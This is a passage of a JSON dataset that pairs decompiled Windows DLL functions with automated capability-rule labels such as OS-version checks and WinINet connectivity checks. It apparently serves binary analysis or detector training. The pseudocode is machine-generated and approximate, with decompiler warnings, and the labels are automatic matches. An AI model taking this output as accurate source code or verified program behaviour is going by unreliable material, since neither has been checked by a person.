  if (0xf < uStack1312) {\n        iVar7 = CONCAT62(Stack1334, CONCAT11(uStack1335, uStack1336));\n        iVar6 = iVar7;\n        if ((0xfff < uStack1312 + 1) && (iVar6 = *(iVar7 + -8),  0x1f < (iVar7 - iVar6) - 8U)) {\ncode_r0x00018003f7fb:\n            fcn.1800b3528();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.18008fb24(iVar6);\n    }\n    iStack1320 = CONCAT44(*0x180101914, *0x180101910);\n    uStack1312 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack1336 = 0;\n    if (0xf < uStack1280) {\n        iVar6 = aiStack1304[0];\n        if (0xfff < uStack1280 + 1) {\n            iVar6 = *(aiStack1304[0] + -8);\n            if (0x1f < (aiStack1304[0] - iVar6) - 8U) {\n                fcn.1800b3528(iStack1320, iVar6, uStack1280 + 0x28);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar6);\n    }\n    iVar6 = iVar3;\n    (**0x1800de7f0)(*(arg1 + 0x118), 0x182, iVar6, 0);\n    (**0x1800de7f0)(*(arg1 + 0x118), 0x181, iVar6, aiStack1096);\n    (**0x1800de7f0)(*(arg1 + 0x118), 0x186, iVar6, 0);\n    *(arg1 + 0x91) = 0;\n    *(arg1 + 0x30) = 1;\n    fcn.18003eb10(arg1);\ncode_r0x00018003f7b1:\n    fcn.18008fb00(uStack40 ^ auStack1384);\n    return;\n}\n",
        "token_count": 2377
    },
    "18004065": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180040650(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    ulong *puVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    ulong var_50h;\n    uint64_t var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    uint uStack48;\n    uint uStack44;\n    ulong var_bp_20h;\n    uint64_t var_bp_18h;\n    ulong var_bp_10h;\n    \n    var_bp_10h = 0xfffffffffffffffe;\n    if (*(arg1 + 0x51) == '\\0') {\n        var_40h = CONCAT44(*0x180101904, *0x180101900);\n        var_38h._0_4_ = *0x180101908;\n        var_38h._4_4_ = *0x18010190c;\n        var_50h._0_2_ = 0;\n        fcn.180010d70(&var_50h, 0x1800f8150, 0x1d);\n        uVar4 = var_40h;\n        if (CONCAT44(var_38h._4_4_, var_38h) == var_40h) {\n            puVar5 = fcn.180013690(&var_50h, 1, 0, 0x1800f6ffc);\n        }\n        else {\n            uVar1 = var_40h + 1;\n            var_40h = uVar1;\n            puVar5 = &var_50h;\n            if (7 < CONCAT44(var_38h._4_4_, var_38h)) {\n                puVar5 = CONCAT62(var_50h._2_6_, var_50h);\n            }\n            *(puVar5 + uVar4 * 2) = 0x2a;\n            *(puVar5 + uVar1 * 2) = 0;\n            puVar5 = &var_50h;\n        }\n        var_30h._0_2_ = *puVar5;\n        var_30h._2_2_ = *puVar5 >> 0x10;\n        var_30h._4_4_ = *(puVar5 + 4);\n        uStack48 = *(puVar5 + 1);\n        uStack44 = *(puVar5 + 0xc);\n        var_bp_20h = puVar5[2];\n        var_bp_18h = puVar5[3];\n        puVar5[2] = 0;\n        puVar5[3] = 7;\n        *puVar5 = 0;\n        puVar5 = &var_30h;\n        if (7 < var_bp_18h) {\n            puVar5 = CONCAT44(var_30h._4_4_, CONCAT22(var_30h._2_2_, var_30h));\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x2815, puVar5);\n        if (var_bp_18h < 8) {\ncode_r0x0001800407a3:\n            var_bp_20h = CONCAT44(*0x180101904, *0x180101900);\n            var_bp_18h = CONCAT44(*0x18010190c, *0x180101908);\n            var_30h._0_2_ = 0;\n            if (CONCAT44(var_38h._4_4_, var_38h) < 8) {\ncode_r0x0001800407f4:\n                fcn.180068600(*(arg1 + 0x18), 0x2815);\n                goto code_r0x000180040802;\n            }\n            iVar7 = CONCAT62(var_50h._2_6_, var_50h);\n            iVar6 = iVar7;\n            if ((CONCAT44(var_38h._4_4_, var_38h) * 2 + 2 < 0x1000) ||\n               (iVar6 = *(iVar7 + -8),  (iVar7 - iVar6) - 8U < 0x20)) {\n                fcn.18008fb24(iVar6);\n                goto code_r0x0001800407f4;\n            }\n        }\n        else {\n            iVar7 = CONCAT44(var_30h._4_4_, CONCAT22(var_30h._2_2_, var_30h));\n            iVar6 = iVar7;\n            if ((var_bp_18h * 2 + 2 < 0x1000) || (iVar6 = *(iVar7 + -8),  (iVar7 - iVar6) - 8U < 0x20)) {\n                fcn.18008fb24(iVar6);\n                goto code_r0x0001800407a3;\n            }\ncode_r0x000180040cb5:\n            fcn.1800b3528();\n        }\n        fcn.1800b3528();\ncode_r0x000180040cc1:\n        fcn.1800b3528();\ncode_r0x000180040cc7:\n        fcn.1800b3528();\ncode_r0x000180040ccd:\n        fcn.1800b3528();\n    }\n    else {\n        (**0x1800de788)(*(arg1 + 0x18), 0x2815, 0x1800f8110);\n        fcn.180068540(*(arg1 + 0x18), 0x2815);\ncode_r0x000180040802:\n        if (*(arg1 + 0x52) == '\\0') {\n            var_40h = CONCAT44(*0x180101904, *0x180101900);\n            var_38h._0_4_ = *0x180101908;\n            var_38h._4_4_ = *0x18010190c;\n            var_50h._0_2_ = 0;\n            fcn.180010d70(&var_50h, 0x1800f81a0, 6);\n            uVar4 = var_40h;\n            if (CONCAT44(var_38h._4_4_, var_38h) == var_40h) {\n                puVar5 = fcn.180013690(&var_50h, 1, 0, 0x1800f70c4);\n            }\n            else {\n                uVar1 = var_40h + 1;\n                var_40h = uVar1;\n                puVar5 = &var_50h;\n                if (7 < CONCAT44(var_38h._4_4_, var_38h)) {\n                    puVar5 = CONCAT62(var_50h._2_6_, var_50h);\n                }\n                *(puVar5 + uVar4 * 2) = 0x2a;\n                *(puVar5 + uVar1 * 2) = 0;\n                puVar5 = &var_50h;\n            }\n            var_30h._0_2_ = *puVar5;\n            var_30h._2_2_ = *puVar5 >> 0x10;\n            var_30h._4_4_ = *(puVar5 + 4);\n            uStack48 = *(puVar5 + 1);\n            uStack44 = *(puVar5 + 0xc);\n            var_bp_20h = puVar5[2];\n            var_bp_18h = puVar5[3];\n            puVar5[2] = 0;\n            puVar5[3] = 7;\n            *puVar5 = 0;\n            puVar5 = &var_30h;\n            if (7 < var_bp_18h) {\n                puVar5 = CONCAT44(var_30h._4_4_, CONCAT22(var_30h._2_2_, var_30h));\n            }\n            (**0x1800de788)(*(arg1 + 0x18), 0x27e0, puVar5);\n            if (7 < var_bp_18h) {\n                iVar7 = CONCAT44(var_30h._4_4_, CONCAT22(var_30h._2_2_, var_30h));\n                iVar6 = iVar7;\n                if ((var_bp_18h * 2 + 2 < 0x1000) || (iVar6 = *(iVar7 + -8),  (iVar7 - iVar6) - 8U < 0x20)) {\n                    fcn.18008fb24(iVar6);\n                    goto code_r0x00018004092b;\n                }\n                goto code_r0x000180040cc1;\n            }\ncode_r0x00018004092b:\n            var_bp_20h = CONCAT44(*0x180101904, *0x180101900);\n            var_bp_18h = CONCAT44(*0x18010190c, *0x180101908);\n            var_30h._0_2_ = 0;\n            if (CONCAT44(var_38h._4_4_, var_38h) < 8) {\ncode_r0x00018004097c:\n                fcn.180068600(*(arg1 + 0x18), 0x27e0);\n                goto code_r0x00018004098a;\n            }\n            iVar7 = CONCAT62(var_50h._2_6_, var_50h);\n            iVar6 = iVar7;\n            if ((CONCAT44(var_38h._4_4_, var_38h) * 2 + 2 < 0x1000) ||\n               (iVar6 = *(iVar7 + -8),  (iVar7 - iVar6) - 8U < 0x20)) {\n                fcn.18008fb24(iVar6);\n                goto code_r0x00018004097c;\n            }\n            goto code_r0x000180040cc7;\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x27e0, 0x1800f8190);\n        fcn.180068540(*(arg1 + 0x18), 0x27e0);\ncode_r0x00018004098a:\n        if (*(arg1 + 0x53) != '\\0') {\n            (**0x1800de788)(*(arg1 + 0x18), 0x27f6, 0x1800f81b0);\n            fcn.180068540(*(arg1 + 0x18), 0x27f6);\ncode_r0x000180040b12:\n            if (*(arg1 + 0x54) != '\\0') {\n                (**0x1800de788)(*(arg1 + 0x18), 0x2807, 0x1800f81d0);\n                fcn.180068540(*(arg1 + 0x18), 0x2807);\n                return;\n            }\n            var_40h = CONCAT44(*0x180101904, *0x180101900);\n            var_38h._0_4_ = *0x180101908;\n            var_38h._4_4_ = *0x18010190c;\n            var_50h._0_2_ = 0;\n            fcn.180010d70(&var_50h, 0x1800f81e0, 6);\n            uVar4 = var_40h;\n            if (CONCAT44(var_38h._4_4_, var_38h) == var_40h) {\n                puVar5 = fcn.180013690(&var_50h, 1, 0, 0x1800f7134);\n            }\n            else {\n                uVar1 = var_40h + 1;\n                var_40h = uVar1;\n                puVar5 = &var_50h;\n                if (7 < CONCAT44(var_38h._4_4_, var_38h)) {\n                    puVar5 = CONCAT62(var_50h._2_6_, var_50h);\n                }\n                *(puVar5 + uVar4 * 2) = 0x2a;\n                *(puVar5 + uVar1 * 2) = 0;\n                puVar5 = &var_50h;\n            }\n            var_30h._0_2_ = *puVar5;\n            var_30h._2_2_ = *puVar5 >> 0x10;\n            var_30h._4_4_ = *(puVar5 + 4);\n            uStack48 = *(puVar5 + 1);\n            uStack44 = *(puVar5 + 0xc);\n            var_bp_20h = puVar5[2];\n            var_bp_18h = puVar5[3];\n            puVar5[2] = 0;\n            puVar5[3] = 7;\n            *puVar5 = 0;\n            puVar5 = &var_30h;\n            if (7 < var_bp_18h) {\n                puVar5 = CONCAT44(var_30h._4_4_, CONCAT22(var_30h._2_2_, var_30h));\n            }\n            (**0x1800de788)(*(arg1 + 0x18), 0x2807, puVar5);\n            if (7 < var_bp_18h) {\n                iVar7 = CONCAT44(var_30h._4_4_, CONCAT22(var_30h._2_2_, var_30h));\n                iVar6 = iVar7;\n                if ((0xfff < var_bp_18h * 2 + 2) && (iVar6 = *(iVar7 + -8),  0x1f < (iVar7 - iVar6) - 8U))\n                goto code_r0x000180040cd9;\n                fcn.18008fb24(iVar6);\n            }\n            var_bp_20h = CONCAT44(*0x180101904, *0x180101900);\n            var_bp_18h = CONCAT44(*0x18010190c, *0x180101908);\n            var_30h._0_2_ = 0;\n            if (CONCAT44(var_38h._4_4_, var_38h) < 8) goto code_r0x000180040c88;\n            iVar6 = CONCAT44(var_38h._4_4_, var_38h) * 2;\n            iVar3 = CONCAT62(var_50h._2_6_, var_50h);\n            iVar7 = iVar3;\n            if (0xfff < iVar6 + 2U) {\n                iVar7 = *(iVar3 + -8);\n                if (0x1f < (iVar3 - iVar7) - 8U) {\n                    fcn.1800b3528(var_bp_20h, iVar7, iVar6 + 0x29);\n                    goto code_r0x000180040cb5;\n                }\n            }\n            fcn.18008fb24(iVar7);\ncode_r0x000180040c88:\n            fcn.180068600(*(arg1 + 0x18), 0x2807);\n            return;\n        }\n        var_40h = CONCAT44(*0x180101904, *0x180101900);\n        var_38h._0_4_ = *0x180101908;\n        var_38h._4_4_ = *0x18010190c;\n        var_50h._0_2_ = 0;\n        fcn.180010d70(&var_50h, 0x1800f81c0, 6);\n        uVar4 = var_40h;\n        if (CONCAT44(var_38h._4_4_, var_38h) == var_40h) {\n            puVar5 = fcn.180013690(&var_50h, 1, 0, 0x1800f70dc);\n        }\n        else {\n            uVar1 = var_40h + 1;\n            var_40h = uVar1;\n            puVar5 = &var_50h;\n            if (7 < CONCAT44(var_38h._4_4_, var_38h)) {\n                puVar5 = CONCAT62(var_50h._2_6_, var_50h);\n            }\n            *(puVar5 + uVar4 * 2) = 0x2a;\n            *(puVar5 + uVar1 * 2) = 0;\n            puVar5 = &var_50h;\n        }\n        var_30h._0_2_ = *puVar5;\n        var_30h._2_2_ = *puVar5 >> 0x10;\n        var_30h._4_4_ = *(puVar5 + 4);\n        uStack48 = *(puVar5 + 1);\n        uStack44 = *(puVar5 + 0xc);\n        var_bp_20h = puVar5[2];\n        var_bp_18h = puVar5[3];\n        puVar5[2] = 0;\n        puVar5[3] = 7;\n        *puVar5 = 0;\n        puVar5 = &var_30h;\n        if (7 < var_bp_18h) {\n            puVar5 = CONCAT44(var_30h._4_4_, CONCAT22(var_30h._2_2_, var_30h));\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x27f6, puVar5);\n        if (7 < var_bp_18h) {\n            iVar7 = CONCAT44(var_30h._4_4_, CONCAT22(var_30h._2_2_, var_30h));\n            iVar6 = iVar7;\n            if ((var_bp_18h * 2 + 2 < 0x1000) || (iVar6 = *(iVar7 + -8),  (iVar7 - iVar6) - 8U < 0x20)) {\n                fcn.18008fb24(iVar6);\n                goto code_r0x000180040ab3;\n            }\n            goto code_r0x000180040ccd;\n        }\ncode_r0x000180040ab3:\n        var_bp_20h = CONCAT44(*0x180101904, *0x180101900);\n        var_bp_18h = CONCAT44(*0x18010190c, *0x180101908);\n        var_30h._0_2_ = 0;\n        if (CONCAT44(var_38h._4_4_, var_38h) < 8) {\ncode_r0x000180040b04:\n            fcn.180068600(*(arg1 + 0x18), 0x27f6);\n            goto code_r0x000180040b12;\n        }\n        iVar7 = CONCAT62(var_50h._2_6_, var_50h);\n        iVar6 = iVar7;\n        if ((CONCAT44(var_38h._4_4_, var_38h) * 2 + 2 < 0x1000) || (iVar6 = *(iVar7 + -8),  (iVar7 - iVar6) - 8U < 0x20)\n           ) {\n            fcn.18008fb24(iVar6);\n            goto code_r0x000180040b04;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x000180040cd9:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 4373
    },
    "180041a1": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_bp_28h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180041a10(int64_t arg1, ulong arg2, int64_t *arg3, uint64_t **arg4)\n\n{\n    uint8_t **ppuVar1;\n    int64_t *piVar2;\n    uint64_t **ppuVar3;\n    code *pcVar4;\n    uint uVar5;\n    uint uVar6;\n    int64_t iVar7;\n    uchar uVar8;\n    int32_t iVar9;\n    uint uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    ulong uVar13;\n    uint8_t **ppuVar14;\n    uint64_t **ppuVar15;\n    ulong uVar16;\n    ushort *arg1_00;\n    uint64_t *puVar17;\n    uint64_t *puVar18;\n    int64_t *piVar19;\n    uint64_t **ppuVar20;\n    uint64_t uVar21;\n    int64_t iVar22;\n    int64_t iVar23;\n    ulong *puVar24;\n    uint64_t uVar25;\n    uint32_t uVar26;\n    ulong *puVar27;\n    uint64_t uVar28;\n    int64_t iVar29;\n    uint64_t uVar30;\n    uchar extraout_XMM0 [16];\n    uchar extraout_XMM0_00 [16];\n    ulong var_80h;\n    ulong var_100h;\n    ulong var_108h;\n    ulong var_110h;\n    ulong var_118h;\n    ulong var_120h;\n    ulong var_128h;\n    ulong var_130h;\n    ulong var_138h;\n    ulong var_140h;\n    ulong var_158h;\n    ulong var_160h;\n    ulong var_170h;\n    ulong var_178h;\n    ulong var_180h;\n    ulong var_190h;\n    uchar auStack744 [32];\n    uint64_t **ppuStack712;\n    uint64_t **ppuStack704;\n    uint64_t *puStack696;\n    uint uStack688;\n    uint uStack684;\n    uint64_t *puStack680;\n    uint64_t uStack672;\n    uint64_t *puStack664;\n    uint uStack656;\n    uint uStack652;\n    uint64_t *puStack648;\n    uint64_t uStack640;\n    uint64_t **ppuStack632;\n    ulong uStack624;\n    ulong uStack608;\n    uint64_t uStack600;\n    int64_t iStack592;\n    uint32_t uStack584;\n    int32_t iStack576;\n    int32_t iStack572;\n    int64_t *piStack568;\n    uint64_t **ppuStack560;\n    int64_t *piStack552;\n    int64_t iStack544;\n    uint64_t **ppuStack536;\n    uint64_t *apuStack528 [4];\n    ulong uStack496;\n    uchar auStack488 [128];\n    uchar auStack360 [128];\n    int64_t *piStack232;\n    uchar auStack224 [16];\n    int64_t iStack208;\n    uchar auStack200 [8];\n    ulong uStack192;\n    int64_t iStack184;\n    uint uStack176;\n    uint uStack172;\n    uint64_t *apuStack168 [3];\n    uint64_t uStack144;\n    uchar uStack136;\n    unkbyte7 Stack135;\n    ulong var_bp_78h;\n    ulong var_bp_70h;\n    uint64_t var_bp_68h;\n    uint64_t **var_60h;\n    uint64_t var_54h;\n    ulong var_bp_48h;\n    ulong var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_bp_28h;\n    ulong var_8h;\n    \n    uStack496 = 0xfffffffffffffffe;\n    *NULL = *0x180123080 ^ auStack744;\n    uVar26 = 0;\n    uStack584 = 0;\n    piStack552 = arg3;\n    iStack544 = arg1;\n    ppuStack536 = arg4;\n    piStack232 = arg3;\n    if (arg3[2] == 0) {\n        fcn.180020af0(&var_60h, 6, 0x1800f74d4, arg2 + 1);\n        iVar23 = -1;\n        do {\n            iVar29 = iVar23 + 1;\n            iVar22 = iVar23 + 1;\n            iVar23 = iVar29;\n        } while (*(&var_60h + iVar22) != '\\0');\n        fcn.180011120(arg3, &var_60h, iVar29);\n    }\n    puVar27 = arg2 * 0x60 + *(arg1 + 0xc0);\n    var_60h = &uStack624;\n    ppuStack712 = fcn.18000da90(&uStack624, arg4);\n    ppuStack632 = &puStack664;\n    puStack648 = NULL;\n    uStack640 = 0xf;\n    puStack664 = puStack664 & 0xffffffffffffff00;\n    fcn.180011120(&puStack664, 0x1800f8220, 8);\n    ppuVar15 = &puStack696;\n    uVar13 = fcn.18000de50(ppuVar15, arg3);\n    uVar13 = fcn.1800065d0(ppuVar15, apuStack168, uVar13, &puStack664);\n    fcn.18000dd60(puVar27, uVar13);\n    if (uStack144 < 0x10) {\ncode_r0x000180041b8c:\n        var_60h = &puStack696;\n        puStack680 = NULL;\n        uStack672 = 0xf;\n        puStack696 = puStack696 & 0xffffffffffffff00;\n        fcn.180011120(&puStack696, 0x1800f4789, 0);\n        iStack184 = CONCAT44(*0x180101914, *0x180101910);\n        uStack176 = *0x180101918;\n        uStack172 = *0x18010191c;\n        _auStack200 = ZEXT1516(stack0xffffffffffffff39) << 8;\n        fcn.180011120(auStack200, 0x1800f478a, 0);\n        puStack648 = CONCAT44(*0x180101914, *0x180101910);\n        uStack640 = CONCAT44(*0x18010191c, *0x180101918);\n        puStack664 = puStack664 & 0xffffffffffffff00;\n        ppuVar15 = &puStack664;\n        fcn.180011120(ppuVar15, 0x1800f8238, 9);\n        ppuStack704 = &puStack696;\n        ppuStack712 = auStack200;\n        uVar13 = fcn.180004f50(ppuVar15, &uStack624, puVar27, &puStack664);\n        fcn.18000d960(puVar27 + 4, uVar13);\n        if (7 < uStack600) {\n            iVar22 = CONCAT62(uStack624._2_6_, uStack624);\n            iVar23 = iVar22;\n            if ((uStack600 * 2 + 2 < 0x1000) || (iVar23 = *(iVar22 + -8),  (iVar22 - iVar23) - 8U < 0x20)) {\n                fcn.18008fb24(iVar23);\n                goto code_r0x000180041c8e;\n            }\n            goto code_r0x000180042cde;\n        }\ncode_r0x000180041c8e:\n        uStack608 = *0x180101900;\n        uStack600 = *0x180101908;\n        uStack624._0_2_ = 0;\n        if (uStack640 < 0x10) {\ncode_r0x000180041cde:\n            puStack648 = CONCAT44(*0x180101914, *0x180101910);\n            uStack640 = CONCAT44(*0x18010191c, *0x180101918);\n            puStack664 = puStack664 & 0xffffffffffffff00;\n            if (0xf < CONCAT44(uStack172, uStack176)) {\n                puVar18 = auStack200;\n                if ((0xfff < CONCAT44(uStack172, uStack176) + 1) &&\n                   (puVar18 = auStack200[-1],  0x1f < auStack200 + (-8 - puVar18))) goto code_r0x000180042cea;\n                fcn.18008fb24(puVar18);\n            }\n            if (puVar27[6] == 0) {\n                uVar13 = fcn.1800687b0(auStack488);\n                puVar24 = puVar27;\n                if (0xf < puVar27[3]) {\n                    puVar24 = *puVar27;\n                }\n                fcn.180069050(uVar13, &uStack624, puVar24, puVar27[2] + puVar24);\n                uVar26 = 0x30;\n                fcn.1800686c0(auStack488);\n                fcn.18000d960(puVar27 + 4, &uStack624);\n                if (uStack600 < 8) goto code_r0x000180041dc5;\n                iVar22 = CONCAT62(uStack624._2_6_, uStack624);\n                iVar23 = iVar22;\n                if (uStack600 * 2 + 2 < 0x1000) {\ncode_r0x000180041dc0:\n                    fcn.18008fb24(iVar23);\n                    goto code_r0x000180041dc5;\n                }\n                iVar29 = uStack600 * 2 + 0x29;\n                iVar23 = *(iVar22 + -8);\n                if ((iVar22 - iVar23) - 8U < 0x20) goto code_r0x000180041dc0;\ncode_r0x000180042ccc:\n                fcn.1800b3528(iVar23, iVar29);\n            }\n            else {\ncode_r0x000180041dc5:\n                var_60h = &puStack664;\n                puStack648 = NULL;\n                uStack640 = 0;\n                puVar18 = arg4[2];\n                ppuVar15 = arg4;\n                if (0x7 < arg4[3]) {\n                    ppuVar15 = *arg4;\n                }\n                if (puVar18 < 0x8) {\n                    puStack664 = *ppuVar15;\n                    uStack656 = *(ppuVar15 + 1);\n                    uStack652 = *(ppuVar15 + 0xc);\n                    uVar21 = 7;\n                }\n                else {\n                    uVar21 = puVar18 | 7;\n                    if (0x7ffffffffffffffe < uVar21) {\n                        uVar21 = 0x7ffffffffffffffe;\n                    }\n                    puStack664 = fcn.180011cf0(&puStack664, uVar21 + 1);\n                    fcn.1800ade80(puStack664, ppuVar15, puVar18 * 2 + 2);\n                }\n                ppuStack632 = &puStack696;\n                puStack680 = NULL;\n                uStack672 = 0xf;\n                puStack696 = puStack696 & 0xffffffffffffff00;\n                puStack648 = puVar18;\n                uStack640 = uVar21;\n                fcn.180011120(&puStack696, 0x1800f8248, 0xd);\n                uVar13 = fcn.18000de50(&uStack624, arg3);\n                ppuStack712 = &puStack664;\n                ppuVar14 = fcn.1800065d0(ppuStack712, apuStack168, uVar13, &puStack696);\n                ppuVar1 = ppuVar14 + 2;\n                if (0xf < ppuVar14[3]) {\n                    ppuVar14 = *ppuVar14;\n                }\n                if (*ppuVar1 == 0x1) {\n                    if (*ppuVar14 == 0x59) {\n                        uVar11 = 0;\n                    }\n                    else {\n                        uVar11 = -(*ppuVar14 < 0x59) | 1;\n                    }\n                    if (uVar11 != 0) goto code_r0x000180041ed8;\n                    uVar8 = 1;\n                }\n                else {\ncode_r0x000180041ed8:\n                    uVar8 = 0;\n                }\n                *(puVar27 + 8) = uVar8;\n                if (0xf < uStack144) {\n                    puVar18 = apuStack168[0];\n                    if (0xfff < uStack144 + 1) {\n                        puVar18 = apuStack168[0][-1];\n                        if (0x1f < apuStack168[0] + (-8 - puVar18)) {\n                            fcn.1800b3528(puVar18, uStack144 + 0x28);\n                            goto code_r0x000180042cf6;\n                        }\n                    }\n                    fcn.18008fb24(puVar18);\n                }\n                uVar13 = fcn.18000de50(apuStack168, puVar27);\n                iVar23 = iStack544;\n                fcn.180041300(iStack544, uVar13);\n                var_60h = apuStack168;\n                ppuVar15 = fcn.18000da90(apuStack168, arg4);\n                ppuStack632 = &puStack664;\n                puStack648 = NULL;\n                uStack640 = 0xf;\n                puStack664 = puStack664 & 0xffffffffffffff00;\n                fcn.180011120(&puStack664, 0x1800f8258, 0xd);\n                arg1_00 = &uStack624;\n                uVar13 = fcn.18000de50(arg1_00, arg3);\n                ppuStack712 = ppuVar15;\n                fcn.1800065d0(arg1_00, &uStack136, uVar13, &puStack664);\n                auStack224 = ZEXT816(0);\n                iStack208 = 0;\n                puStack648 = CONCAT44(*0x180101914, *0x180101910);\n                uStack640 = CONCAT44(*0x18010191c, *0x180101918);\n                puStack664 = puStack664 & 0xffffffffffffff00;\n                ppuVar15 = &puStack664;\n                fcn.180011120(ppuVar15, 0x1800f724c, 1);\n                iStack572 = fcn.18000a0f0(ppuVar15, &uStack136, auStack224, &puStack664);\n                if (0xf < uStack640) {\n                    puVar18 = puStack664;\n                    if ((0xfff < uStack640 + 1) && (puVar18 = puStack664[-1],  0x1f < puStack664 + (-8 - puVar18))) {\ncode_r0x000180042cf6:\n                        fcn.1800b3528();\n                        pcVar4 = swi(3);\n                        (*pcVar4)();\n                        return;\n                    }\n                    fcn.18008fb24(puVar18);\n                }\n                ppuVar15 = *(iVar23 + 0xb0) - *(iVar23 + 0xa8) >> 6;\n                piVar19 = puVar27 + 9;\n                iVar23 = puVar27[10];\n                iVar22 = *piVar19;\n                piStack568 = piVar19;\n                var_60h = ppuVar15;\n                if (iVar22 != iVar23) {\n                    do {\n                        fcn.180048ec0(iVar22 + 0x48);\n                        fcn.180042e30(iVar22);\n                        iVar22 = iVar22 + 0x60;\n                    } while (iVar22 != iVar23);\n                    iVar22 = *piVar19;\n                }\n                iVar12 = iStack572;\n                puVar27[10] = iVar22;\n                fcn.180048b10(piVar19, iStack572);\n                iStack576 = 0;\n                if (0 < iVar12) {\n                    iStack592 = 0;\n                    do {\n                        iVar12 = iStack576;\n                        iVar23 = iStack592 * 0x20;\n                        puVar27 = auStack224._0_8_ + iVar23;\n                        puStack680 = NULL;\n                        uStack672 = 0xf;\n                        puStack696 = puStack696 & 0xffffffffffffff00;\n                        if (puVar27[2] < 3) goto code_r0x000180042d3e;\n                        iVar29 = puVar27[2] - 3;\n                        iVar22 = -1;\n                        if (iVar29 != -1) {\n                            iVar22 = iVar29;\n                        }\n                        if (0xf < puVar27[3]) {\n                            puVar27 = *puVar27;\n                        }\n                        fcn.180011120(&puStack696, puVar27 + 3, iVar22);\n                        uStack584 = uVar26 | 0x40;\n                        iVar9 = fcn.1800679c0(&puStack696, 10);\n                        if (0xf < uStack672) {\n                            puVar18 = puStack696;\n                            if (uStack672 + 1 < 0x1000) {\ncode_r0x00018004217c:\n                                fcn.18008fb24(puVar18);\n                                goto code_r0x000180042181;\n                            }\n                            puVar18 = puStack696[-1];\n                            if (puStack696 + (-8 - puVar18) < 0x20) goto code_r0x00018004217c;\n                            fcn.1800b3528(puVar18, uStack672 + 0x28);\ncode_r0x000180042d02:\n                            fcn.1800b3528();\n                            goto code_r0x000180042d08;\n                        }\ncode_r0x000180042181:\n                        puStack680 = NULL;\n                        uStack672 = 0xf;\n                        puStack696 = puStack696 & 0xffffffffffffff00;\n                        piVar19 = iVar23 + auStack224._0_8_;\n                        iVar29 = iVar12 * 0x60;\n                        iVar22 = *piStack568 + iVar29;\n                        if (iVar22 != piVar19) {\n                            piVar2 = piVar19 + 2;\n                            if (0xf < piVar19[3]) {\n                                piVar19 = *piVar19;\n                            }\n                            fcn.180011120(iVar22, piVar19, *piVar2);\n                        }\n                        if (iVar9 + -1 < ppuVar15) {\n                            ppuVar15 = (iVar9 + -1) * 0x40 + 0x20 + *(iStack544 + 0xa8);\n                            puVar18 = ppuVar15[2];\n                            if (0x7 < ppuVar15[3]) {\n                                ppuVar15 = *ppuVar15;\n                            }\n                            if (puVar18 < 0x8) {\n                                puStack664 = *ppuVar15;\n                                uStack656 = *(ppuVar15 + 1);\n                                uStack652 = *(ppuVar15 + 0xc);\n                                uStack640 = 7;\n                            }\n                            else {\n                                uVar21 = puVar18 | 7;\n                                if (0x7ffffffffffffffe < uVar21) {\n                                    uVar21 = 0x7ffffffffffffffe;\n                                }\n                                puStack664 = fcn.180011cf0(&puStack664, uVar21 + 1);\n                                fcn.1800ade80(puStack664, ppuVar15, puVar18 * 2 + 2);\n                                uStack640 = uVar21;\n                            }\n                            ppuVar15 = &puStack664;\n                            uVar26 = uVar26 | 0x42;\n                            puStack648 = puVar18;\n                        }\n                        else {\n                            puVar24 = iVar23 + auStack224._0_8_;\n                            uVar13 = fcn.1800687b0(auStack488);\n                            puVar27 = puVar24;\n                            if (0xf < puVar24[3]) {\n                                puVar27 = *puVar24;\n                            }\n                            fcn.180069050(uVar13, &uStack624, puVar27, puVar24[2] + puVar27);\n                            fcn.1800686c0(auStack488);\n                            ppuVar15 = &uStack624;\n                            uVar26 = uVar26 | 0x1c1;\n                        }\n                        fcn.18000d960(*piStack568 + 0x20 + iVar29, ppuVar15);\n                        if (((uVar26 & 2) != 0) && (uVar26 = uVar26 & 0xfffffffd,  7 < uStack640)) {\n                            puVar18 = puStack664;\n                            if ((0xfff < uStack640 * 2 + 2) &&\n                               (puVar18 = puStack664[-1],  0x1f < puStack664 + (-8 - puVar18)))\n                            goto code_r0x000180042d02;\n                            fcn.18008fb24(puVar18);\n                        }\n                        if (((uVar26 & 1) != 0) && (uVar26 = uVar26 & 0xfffffffe,  7 < uStack600)) {\n                            iVar22 = CONCAT62(uStack624._2_6_, uStack624);\n                            iVar23 = iVar22;\n                            if ((uStack600 * 2 + 2 < 0x1000) ||\n                               